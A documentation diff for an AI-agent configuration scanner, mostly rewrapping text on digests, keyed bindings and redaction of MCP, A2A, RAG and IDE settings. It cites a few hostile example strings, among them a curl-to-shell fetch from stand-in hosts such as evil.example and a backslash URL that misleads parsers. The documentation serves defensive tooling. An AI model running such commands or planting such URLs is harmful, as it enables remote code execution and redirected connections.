@@ -5,21 +5,21 @@ evidence. Static MCP server records carry two kinds of source binding.
 
 `static_config_hash` (profile `nexus-symbiote/mcp-static-config/v4`) is an RFC 8785
 digest of the server's exported structure: configuration field names, the displayed
-command basename, the classified launcher with its wrappers and effective command,
-the identity, version and pin of every package it launches, package source origins,
-the names of the project resolver settings that apply to it, launch context flags and
+command basename, the classified launcher with its wrappers and effective command, the
+identity, version and pin of every package it launches, package source origins, the
+names of the project resolver settings that apply to it, launch context flags and
 counts, transport, endpoint origin, argument count, environment variable and header
-names, client settings (auto-approval, disabled, tool filters, with the sorted, redacted
-names of the tools that `alwaysAllow`, `autoApprove`, `includeTools`, `excludeTools`,
-`enabled_tools`, `disabled_tools` and `disabledTools` list, one list per field because
-each client reads only some of them) and declared tool names.
+names, client settings (auto-approval, disabled, tool filters, with the sorted,
+redacted names of the tools that `alwaysAllow`, `autoApprove`, `includeTools`,
+`excludeTools`, `enabled_tools`, `disabled_tools` and `disabledTools` list, one list
+per field because each client reads only some of them) and declared tool names.
+
 It covers only information the record exports in clear, so it reveals nothing about
 secret values. It detects added or removed arguments, environment variables, headers,
-fields, resolver settings and tools, a tool swapped into or out of an auto-approval
-or tool filter list at the same count or moved between `alwaysAllow` and
-`autoApprove`, and changed launchers, package identities and
-versions (including dependencies added with `--with`), package source origins, launch
-context and endpoint origins.
+fields, resolver settings and tools, a tool swapped into or out of an auto-approval or
+tool filter list at the same count or moved between `alwaysAllow` and `autoApprove`,
+and changed launchers, package identities and versions (including dependencies added
+with `--with`), package source origins, launch context and endpoint origins.
 
 Package sources are the registry and index options of a launcher (`--registry`,
 `--@scope:registry`, `--index-url`, `--find-links` and similar), environment
@@ -43,36 +43,43 @@ use instead for a launcher other than `npx` and `npm exec`; a `scope` that holds
 `${...}` may name any scope, so it is an `[unresolved]` source when the file gives
 some scope a registry), cache, offline, proxy, `strict-ssl=false`,
 CA, user and global configuration, prefix, workspace and store settings are sources;
-auth settings (`//host/:...`, `_auth`, `username` and similar) are ignored. For npm and
-pnpm, every setting is classified, from `.npmrc` and from `npm_config_*` or
+auth settings (`//host/:...`, `_auth`, `username` and similar) are ignored.
+
+For npm and pnpm, every setting is classified, from `.npmrc` and from `npm_config_*` or
 `pnpm_config_*` variables alike: `call` and `package` decide what `npm exec` runs, so
 they make the launcher identity unknown (a high `launcher_identity` finding and a gap);
 `script-shell`, `node-options`, `shell`, `git`, `node-gyp`, `pnpmfile` and similar load
 local code (a medium `launch_context` risk); npm's own configuration keys and common
 pnpm keys that change neither are ignored; and any other setting is a source, because
 npm passes it to lifecycle scripts, whose installers read binary mirrors from it.
+
 Yarn's `yarnPath` and `plugins` (`.yarnrc.yml`, or `YARN_YARN_PATH` and
 `YARN_PLUGINS`) and `yarn-path` (`.yarnrc`) run local code in place of or inside Yarn
 and make the identity unknown; proxy, CA, strict-SSL,
 cache, checksum, offline, network and environment-file settings of `.yarnrc.yml` are
 sources, and a `.env.yarn` file, which Yarn 4 loads by default, is `[unresolved]`.
+
 Sources are exported as `package_sources` entries such as
 `.npmrc:@acme:registry=https://npm.acme.example`: the origin only, `[local]` for a
-path or other value and `[unresolved]` for a value with `${...}` expansion. A server
-that runs in another working directory (a `cwd` other than the root, `env -C`,
+path or other value and `[unresolved]` for a value with `${...}` expansion.
+
+A server that runs in another working directory (a `cwd` other than the root, `env -C`,
 `pwsh -WorkingDirectory`, `wsl --cd`, `uv --directory` or `--project`,
 `deno --config`) may read other resolver files, so it carries
 `working-directory=[unresolved]`, and so does a server declared in a configuration
 file below the root (such as `packages/api/.mcp.json`), which its client starts in
-that file's directory; one whose variables come from an `envFile` or from
-`dotenvx`, `doppler`, `infisical`, `op run --env-file`, `uv --env-file` or
-`deno run --env-file` carries
-`environment-file=[unresolved]`. A variable that adds a trusted CA or disables TLS
-verification (`NODE_EXTRA_CA_CERTS`, `NODE_TLS_REJECT_UNAUTHORIZED=0`,
-`SSL_CERT_FILE`, `REQUESTS_CA_BUNDLE` and similar) is a source, and so are the
-`HTTPS_PROXY`, `HTTP_PROXY` and `ALL_PROXY` variables beside it. A redirected package
-keeps its version but loses `launcher_package` and `package_url`, and carries a medium
-`package_source` risk. Setting names are exported as `resolver_settings` and digested
+that file's directory; one whose variables come from an `envFile` or from `dotenvx`,
+`doppler`, `infisical`, `op run --env-file`, `uv --env-file` or `deno run --env-file`
+carries `environment-file=[unresolved]`.
+
+A variable that adds a trusted CA or disables TLS verification
+(`NODE_EXTRA_CA_CERTS`, `NODE_TLS_REJECT_UNAUTHORIZED=0`, `SSL_CERT_FILE`,
+`REQUESTS_CA_BUNDLE` and similar) is a source, and so are the `HTTPS_PROXY`,
+`HTTP_PROXY` and `ALL_PROXY` variables beside it. A redirected package keeps its
+version but loses `launcher_package` and `package_url`, and carries a medium
+`package_source` risk.
+
+Setting names are exported as `resolver_settings` and digested
 only when they come from a fixed vocabulary (npm and pnpm configuration keys, the
 Yarn, bun and uv settings above, a scoped registry whose well-formed scope is a
 launched package's scope or the configured `scope` npm selects, or the `sources` entry
@@ -176,19 +183,22 @@ A2A records export URLs only as origins (scheme, host and port): the path, query
 fragment and user information of a card's `url`, of its A2A 1.0
 `supportedInterfaces` and A2A 0.3 `additionalInterfaces` URLs, of security scheme
 URLs such as `tokenUrl` and `openIdConnectUrl`, and of a client's `agentCardUrl`
-never enter the BOM. A URL without a scheme keeps its host and port in the form
-`//host:port`: the network-path reference `//auth.example.com/token` is exported as
+never enter the BOM.
+
+A URL without a scheme keeps its host and port in the form `//host:port`: the
+network-path reference `//auth.example.com/token` is exported as
 `//auth.example.com`, and the A2A 1.0 gRPC address `grpc.example.com:443` as
-`//grpc.example.com:443`. A URL whose origin cannot be exported is exported as
-`[redacted]` and counts as unbound: one without a host or with an invalid port, a
-bare `host:port` or `host/path` whose host is not a dotted name, `localhost` or a
-bracketed IP, or one whose host, as Python's parser reads it, contains a character
-other than letters, digits, `.`, `-`, `_` or `:`, such as `https://host\path`
-(WHATWG parsers read a path after the backslash). A backslash before an `@` is not
-caught: `https://evil.example\@good.example/` is exported as `https://good.example`
-while WHATWG parsers connect to `evil.example`, and the change raises only the
-high structure-digest alert for user information (`properties.static_card_hash
-changed`).
+`//grpc.example.com:443`.
+
+A URL whose origin cannot be exported is exported as `[redacted]` and counts as
+unbound: one without a host or with an invalid port, a bare `host:port` or
+`host/path` whose host is not a dotted name, `localhost` or a bracketed IP, or one
+whose host, as Python's parser reads it, contains a character other than letters,
+digits, `.`, `-`, `_` or `:`, such as `https://host\path` (WHATWG parsers read a path
+after the backslash). A backslash before an `@` is not caught:
+`https://evil.example\@good.example/` is exported as `https://good.example` while
+WHATWG parsers connect to `evil.example`, and the change raises only the high
+structure-digest alert for user information (`properties.static_card_hash changed`).
 
 The scanner reads A2A 0.3 cards and A2A 1.0 cards. For 1.0 it follows the
 `lf.a2a.v1` messages in `specification/a2a.proto` of the A2A repository and, as
@@ -257,25 +267,28 @@ without publishing a guessable hash of the original names. Use distinct,
 non-secret scheme identifiers, then recollect and review the card.
 
 `authentication_required` is true only when the card declares at least one of
-`security`, `securityRequirements` or a legacy `authentication` object, and each
-one it declares passes: every alternative in `security` and `securityRequirements`
-is non-empty and names only declared schemes that state a type the collector
-recognises (a type such as `none` maps to `other` and does not count), and a legacy
+`security`, `securityRequirements` or a legacy `authentication` object, and each one
+it declares passes: every alternative in `security` and `securityRequirements` is
+non-empty and names only declared schemes that state a type the collector recognises
+(a type such as `none` maps to `other` and does not count), and a legacy
 `authentication` object lists at least one scheme name other than `none`, `noauth`,
-`no-auth`, `anonymous`, `public` or `unauthenticated`, in any case. The legacy object counts only for a
-card without `securitySchemes`, `securityRequirements` or `supportedInterfaces`,
-because clients of the 0.3 and 1.0 declarations do not read it. An empty alternative (`{}` or `{"schemes": {}}`) permits
-anonymous access, and an empty list declares no requirement. The specifications do
-not say how a skill's requirements combine with the card's, so skill requirements
-can make `authentication_required` false but never true. A skill alternative that
-is empty or names an undeclared or untyped scheme makes it false, with a medium
-`authentication` finding that a skill has no non-empty requirement. Requirements
-declared only on skills leave a card without requirements of its own at false. An
-empty skill list adds no requirement, because proto3 JSON does not distinguish it
-from an absent field. A `null` `securitySchemes`, `security`,
-`securityRequirements`, `authentication` or `authentication.schemes` counts as
-absent, and so does a skill's `null` `security` or `securityRequirements`. These are
-declarations: they do not show that an endpoint enforces authentication.
+`no-auth`, `anonymous`, `public` or `unauthenticated`, in any case. The legacy object
+counts only for a card without `securitySchemes`, `securityRequirements` or
+`supportedInterfaces`, because clients of the 0.3 and 1.0 declarations do not read it.
+
+An empty alternative (`{}` or `{"schemes": {}}`) permits anonymous access, and an
+empty list declares no requirement. The specifications do not say how a skill's
+requirements combine with the card's, so skill requirements can make
+`authentication_required` false but never true. A skill alternative that is empty or
+names an undeclared or untyped scheme makes it false, with a medium `authentication`
+finding that a skill has no non-empty requirement. Requirements declared only on
+skills leave a card without requirements of its own at false.
+
+An empty skill list adds no requirement, because proto3 JSON does not distinguish it
+from an absent field. A `null` `securitySchemes`, `security`, `securityRequirements`,
+`authentication` or `authentication.schemes` counts as absent, and so does a skill's
+`null` `security` or `securityRequirements`. These are declarations: they do not show
+that an endpoint enforces authentication.
 
 Every A2A server record, and every client record read from an A2A configuration
 file, carries `static_card_hash` (profile `nexus-symbiote/a2a-card-structure/v4`)
@@ -293,10 +306,12 @@ separators, whether a query, fragment or user information is present, and the pa
 itself only when it is a public root path (`/` or, for clients,
 `/.well-known/agent.json` or `/.well-known/agent-card.json`). They hold no other
 path, query or tenant value, so a same-origin path change that keeps the number of
-path separators, and does not move to or from a root path, leaves them unchanged. They are unkeyed, so anyone holding the BOM can test guesses against
-them. They reveal field and scheme names, path depth and whether user information or
-a query is present, and they let a BOM holder confirm a guess of the requirement
-values of schemes other than `oauth2` and `openIdConnect`.
+path separators, and does not move to or from a root path, leaves them unchanged.
+
+They are unkeyed, so anyone holding the BOM can test guesses against them. They reveal
+field and scheme names, path depth and whether user information or a query is present,
+and they let a BOM holder confirm a guess of the requirement values of schemes other
+than `oauth2` and `openIdConnect`.
 
 With `NEXUS_SYMBIOTE_SOURCE_BINDING_KEY` set, records also carry
 `static_value_binding`, an HMAC-SHA256 under that key over the whole card (profile
@@ -360,12 +375,16 @@ file shares. The description keeps names, booleans and nulls, and each URL as it
 exported origin and shape; other text and numbers enter it only as their type.
 Values under a `documents` field in these other fields are treated as inline content:
 only their presence, count or type is recorded, and URLs inside them are not treated
-as endpoints. URL origins elsewhere are exported as `endpoint_origins` and
+as endpoints.
+
+URL origins elsewhere are exported as `endpoint_origins` and
 `configuration_endpoint_origins` and checked for encrypted transport like
 `source_uris`; a finding about the shared
 fields is recorded once, on the file's first source. A file that declares more than
 1,000 such URLs and `source_uris` entries together is a collection failure, since
-each may become a finding. With `NEXUS_SYMBIOTE_SOURCE_BINDING_KEY`
+each may become a finding.
+
+With `NEXUS_SYMBIOTE_SOURCE_BINDING_KEY`
 set, `static_value_binding` is an HMAC-SHA256 (profile
 `nexus-symbiote/rag-source-values/v1`) over the source object and an HMAC of the
 shared fields. Without the key, a source whose URIs go beyond their exported origins,
@@ -424,41 +443,50 @@ and the keys of the Claude Code credential helpers `apiKeyHelper`, `awsAuthRefre
 `awsCredentialExport`, `gcpAuthRefresh` and `otelHeadersHelper`, wherever a settings file names one, but
 not their commands: each becomes `***` whatever it is, since a helper command such as
 `printf passphrase` can hold a credential the redaction does not recognise. No helper
-is run. For the same reason a command, its arguments and the value of an HTTP header
-keep only their shape: the value of every key named `command`, ending in `Command`
-(such as Gemini CLI's `toolDiscoveryCommand`), `args` or `notify`, such as a hook
-command, a `statusLine` command or an MCP server's arguments, keeps the URL origins it
-names, the unquoted shell operators and the program word of each command, and no other
-word, so `check.sh --password 482913` is digested as `check.sh`. A program word is the
-first word of the value or the first after an unquoted `;`, `&`, `|`, line break, `(`,
-`$(` or opening backtick, after any `NAME=value` assignments and file descriptor
-numbers, and is kept only when it expands nothing but a variable name, as in
-`"$CLAUDE_PROJECT_DIR"/hooks/check.sh`. A wrapper such as `sudo`, `env` or `xargs` is
-the program word, and the words it runs are not kept. No word starts a command inside
-quotes, a comment, a redirection target, arithmetic, an array assignment or a
-`[[ ... ]]` test, or after a backslash before a line break, so
-`mysql -uroot \` followed by `-p482913 app_db` on the next line is digested as `mysql`.
-After `case`, whose patterns follow command separators, no word is kept, and a here
-document or here-string operator (`<<`, `<<-` or `<<<`) and everything after it become
-the operator and `***`, so `sudo -S apt-get update <<EOF`, a line `482913` and `EOF`
-are digested as `sudo<<***`. An argument list keeps only URL origins, and each value under
-`headers`, `httpHeaders`, `http_headers` or `env_http_headers`, such as `X-Pin: 482913`,
-in a map or in a list, becomes `***` while its header name stays. A `headersHelper`
-counts as a command. A permission rule in a Claude Code or Cursor `permissions.allow`,
-`ask` or `deny` list, or a Gemini CLI `excludeTools`, `coreTools`, `allowedTools` or
-`tools.exclude`, `tools.core` or `tools.allowed` list, and a hook `matcher` keep their
-tool name and the shape of their specifier, so `Bash(mysql -uroot -p482913 db:*)` is
-digested as `Bash(mysql)` and `Read(./src/**)` stays as it is. A Codex
-`shell_environment_policy.set` map and a `query_params` map keep their names only, as
-`env` does, and a Codex `experimental_bearer_token` or an OAuth `clientSecret` becomes
-`***`. A URL keeps only its scheme, host and
-port, and a credential in an assignment, after an authorization scheme or in a known
-token format is removed. The redaction is applied separately to the text between
+is run.
+
+For the same reason a command, its arguments and the value of an HTTP header keep only
+their shape: the value of every key named `command`, ending in `Command` (such as
+Gemini CLI's `toolDiscoveryCommand`), `args` or `notify`, such as a hook command, a
+`statusLine` command or an MCP server's arguments, keeps the URL origins it names, the
+unquoted shell operators and the program word of each command, and no other word, so
+`check.sh --password 482913` is digested as `check.sh`.
+
+A program word is the first word of the value or the first after an unquoted `;`,
+`&`, `|`, line break, `(`, `$(` or opening backtick, after any `NAME=value`
+assignments and file descriptor numbers, and is kept only when it expands nothing but
+a variable name, as in `"$CLAUDE_PROJECT_DIR"/hooks/check.sh`. A wrapper such as
+`sudo`, `env` or `xargs` is the program word, and the words it runs are not kept.
+
+No word starts a command inside quotes, a comment, a redirection target, arithmetic,
+an array assignment or a `[[ ... ]]` test, or after a backslash before a line break,
+so `mysql -uroot \` followed by `-p482913 app_db` on the next line is digested as
+`mysql`. After `case`, whose patterns follow command separators, no word is kept, and
+a here document or here-string operator (`<<`, `<<-` or `<<<`) and everything after it
+become the operator and `***`, so `sudo -S apt-get update <<EOF`, a line `482913` and
+`EOF` are digested as `sudo<<***`.
+
+An argument list keeps only URL origins, and each value under `headers`, `httpHeaders`,
+`http_headers` or `env_http_headers`, such as `X-Pin: 482913`, in a map or in a list,
+becomes `***` while its header name stays. A `headersHelper` counts as a command. A
+permission rule in a Claude Code or Cursor `permissions.allow`, `ask` or `deny` list,
+or a Gemini CLI `excludeTools`, `coreTools`, `allowedTools` or `tools.exclude`,
+`tools.core` or `tools.allowed` list, and a hook `matcher` keep their tool name and
+the shape of their specifier, so `Bash(mysql -uroot -p482913 db:*)` is digested as
+`Bash(mysql)` and `Read(./src/**)` stays as it is.
+
+A Codex `shell_environment_policy.set` map and a `query_params` map keep their names
+only, as `env` does, and a Codex `experimental_bearer_token` or an OAuth
+`clientSecret` becomes `***`. A URL keeps only its scheme, host and port, and a
+credential in an assignment, after an authorization scheme or in a known token format
+is removed. The redaction is applied separately to the text between
 the shell operators `;`, `|`, `&`, `$`, `` ` ``, `(`, `)`, `{`, `}`, `<`, `>` and line breaks,
 which are kept, so a URL or an assigned value ends at the first of them: a command,
 an operator or a host written after one without white space, such as
 `https://cdn.example/a.sh;curl${IFS}https://evil.example|sh` or `pwd=$(id)`, stays
-covered. In a command, an operator inside quotes, and `$`, `{` and `}` other than in
+covered.
+
+In a command, an operator inside quotes, and `$`, `{` and `}` other than in
 `$(`, do not split the text, and a URL there keeps only its origin. Each URL scheme in such a text also starts a new part, so every URL keeps
 its own host whatever separates it from the text before it, such as the second host
 in `--webhooks=https://hooks.example/n,https://evil.example/x` or the host assigned to
@@ -473,30 +501,34 @@ file holding a URL whose authority URL parsers read differently (a backslash in 
 WHATWG parsers such as Codex's as `attacker.example`, or an `http`, `https`, `ws`,
 `wss` or `ftp` URL with an empty authority) is a failure that names the file, gets no
 digest and fails the scan gate, as the `mcp` collector refuses such an endpoint; with
-the key, the keyed binding covers its host. Keys
-are redacted the same way. When distinct keys redact identically, the digest
+the key, the keyed binding covers its host.
+
+Keys are redacted the same way. When distinct keys redact identically, the digest
 retains all projected values in canonical order rather than dropping earlier entries.
-Anyone holding
-the BOM therefore cannot confirm a guess of a value the
-redaction removes, such as the environment value of an MCP server that
-`.codex/config.toml` declares, which the `mcp` record withholds too, or a
-credential helper command. The cost is that
-without the key a change to such a value alone, such as a new helper command, or a
-new token or URL path on the same host in a `notify` command such as
+Anyone holding the BOM therefore cannot confirm a guess of a value the redaction
+removes, such as the environment value of an MCP server that `.codex/config.toml`
+declares, which the `mcp` record withholds too, or a credential helper command.
+
+The cost is that without the key a change to such a value alone, such as a new helper
+command, or a new token or URL path on the same host in a `notify` command such as
 `TOKEN=x curl https://cdn.example/a.sh | sh`, leaves the record unchanged; the record
 then carries a low `completeness` finding that names the key, and `diff` raises a
 medium alert that its values are unbound on every comparison, changed or not, so a
-keyless `diff --fail-on-alert` fails. Reordered keys and
-whitespace change no digest. With the key, `static_value_binding` is an HMAC-SHA256
-under the key over every file as read
-(profile `nexus-symbiote/ide-settings-values/v1`), so the record still changes with
-any value while no unkeyed digest covers environment values or text the redaction
-removes. A value the redaction leaves in place outside a command, an argument list,
-a header, a permission rule or the maps and keys named above, such as a password
-stored under another key name or a `cwd` path, can still be confirmed from the
-digest, so keep credentials out of settings files. Without the key, a change only to a
-command's arguments, such as a new pinned version in an MCP server's `args`, a new
-option of a hook or `Bash(npm test)` becoming `Bash(npm publish)`, alters no digest, so
+keyless `diff --fail-on-alert` fails.
+
+Reordered keys and whitespace change no digest. With the key, `static_value_binding`
+is an HMAC-SHA256 under the key over every file as read (profile
+`nexus-symbiote/ide-settings-values/v1`), so the record still changes with any value
+while no unkeyed digest covers environment values or text the redaction removes.
+
+A value the redaction leaves in place outside a command, an argument list, a header, a
+permission rule or the maps and keys named above, such as a password stored under
+another key name or a `cwd` path, can still be confirmed from the digest, so keep
+credentials out of settings files.
+
+Without the key, a change only to a command's arguments, such as a new pinned version
+in an MCP server's `args`, a new option of a hook or `Bash(npm test)` becoming
+`Bash(npm publish)`, alters no digest, so
 `diff` cannot name it; the record instead raises the medium unbound-values alert on
 every comparison, so a keyless `--fail-on-alert` fails. A new program, host, operator,
 hook, rule, tool or header name still changes a recorded digest, so
@@ -532,21 +564,23 @@ is not read when the path imported, or the file a symlink there leads to, is
 [named as holding credentials](#files-named-as-holding-credentials).
 
 Every other instruction, rule, prompt or subagent file the `prompt` collector records
-follows the same rule, under the same profile, with its own path in the binding: an instruction, nested memory, rule, prompt
-or subagent file keeps `content_hash` only when its name has a Markdown suffix, is an
-instruction file name without one (`.cursorrules`, `.clinerules`, `.windsurfrules`,
-`system_prompt.txt`), or, in a rule, prompt or subagent directory, has no suffix at
-all, and when the file a symlink there leads to, if any, has a Markdown suffix, the
-same test an import of that file passes. `AGENTS.md` linked to `config/app.json` or
-`config/.windsurfrules` is recorded as `prompt:AGENTS.md` without `content_hash`, as is
-`.cursor/rules/x.json`; an ordinary
-`CLAUDE.md`, `AGENTS.md` linked to `docs/agents.md` and `.cursor/rules/x.mdc` keep it,
-and so does a rule file without a suffix that a directory symlink leads the walk to,
-such as `shared/r/style` behind `.cursor/rules` linked to `shared/r`, whose record
-names the directory in `properties.instruction_directory`. The files of a skill or
-command directory are skill resources: each keeps its unkeyed `sha256` digest whatever
-its name, also when it is a symlink to a file an import inventories without
-`content_hash`, so keep configuration out of skill directories.
+follows the same rule, under the same profile, with its own path in the binding: an
+instruction, nested memory, rule, prompt or subagent file keeps `content_hash` only
+when its name has a Markdown suffix, is an instruction file name without one
+(`.cursorrules`, `.clinerules`, `.windsurfrules`, `system_prompt.txt`), or, in a rule,
+prompt or subagent directory, has no suffix at all, and when the file a symlink there
+leads to, if any, has a Markdown suffix, the same test an import of that file passes.
+
+`AGENTS.md` linked to `config/app.json` or `config/.windsurfrules` is recorded as
+`prompt:AGENTS.md` without `content_hash`, as is `.cursor/rules/x.json`; an ordinary
+`CLAUDE.md`, `AGENTS.md` linked to `docs/agents.md` and `.cursor/rules/x.mdc` keep
+it, and so does a rule file without a suffix that a directory symlink leads the walk
+to, such as `shared/r/style` behind `.cursor/rules` linked to `shared/r`, whose
+record names the directory in `properties.instruction_directory`.
+
+The files of a skill or command directory are skill resources: each keeps its unkeyed
+`sha256` digest whatever its name, also when it is a symlink to a file an import
+inventories without `content_hash`, so keep configuration out of skill directories.
 
 `validate --project` with the key recomputes the binding from the file and counts it
 as a verified hash, and a changed file as a failed one. A binding under another
@@ -580,23 +614,25 @@ or chat template digest covers it.
 
 ## Upgrade existing snapshots
 
-Older static MCP snapshots lack the source binding and configured tool locators,
-and older A2A snapshots lack the structure digests or carry the superseded
-`nexus-symbiote/a2a-card-structure/v1`, `v2` or `v3` profile; older RAG records carry no
-structure digest or the superseded `nexus-symbiote/rag-source-structure/v1` profile,
-and older IDE agent records no keyed settings binding and no
-`settings_hashes_profile`. Prompt records from earlier builds carry a
-`content_hash` for files this build inventories without one: an `@path` import of a
-file without a Markdown suffix, such as `@prompts/system.txt`, a recorded instruction
-file that is a symlink to such a file, and a rule, prompt or subagent file whose name
-has a suffix other than a Markdown one, such as `.clinerules/style.txt`. Against such a
-baseline, `diff --fail-on-alert` raises a one-time high `Content hash removed` alert on
-each of them, and `validate --project` reports `project-reconciliation-failed`, with or
-without `NEXUS_SYMBIOTE_SOURCE_BINDING_KEY`; without the key, each of them also raises
-the medium alert for unbound values on every comparison. They cannot establish this
-stronger reconciliation contract. Missing or unknown binding profiles fail
-validation and require recollection; copying a newly calculated digest into an
-old approved snapshot is not a migration.
+Older static MCP snapshots lack the source binding and configured tool locators, and
+older A2A snapshots lack the structure digests or carry the superseded
+`nexus-symbiote/a2a-card-structure/v1`, `v2` or `v3` profile; older RAG records carry
+no structure digest or the superseded `nexus-symbiote/rag-source-structure/v1` profile,
+and older IDE agent records no keyed settings binding and no `settings_hashes_profile`.
+
+Prompt records from earlier builds carry a `content_hash` for files this build
+inventories without one: an `@path` import of a file without a Markdown suffix, such
+as `@prompts/system.txt`, a recorded instruction file that is a symlink to such a
+file, and a rule, prompt or subagent file whose name has a suffix other than a
+Markdown one, such as `.clinerules/style.txt`.
+
+Against such a baseline, `diff --fail-on-alert` raises a one-time high `Content hash
+removed` alert on each of them, and `validate --project` reports
+`project-reconciliation-failed`, with or without `NEXUS_SYMBIOTE_SOURCE_BINDING_KEY`;
+without the key, each of them also raises the medium alert for unbound values on every
+comparison. They cannot establish this stronger reconciliation contract. Missing or
+unknown binding profiles fail validation and require recollection; copying a newly
+calculated digest into an old approved snapshot is not a migration.
 
 The v4 A2A card profile refuses ambiguous redacted scheme identifiers. Recollect,
 review and reapprove v3 card baselines even if the card has ordinary names; do not
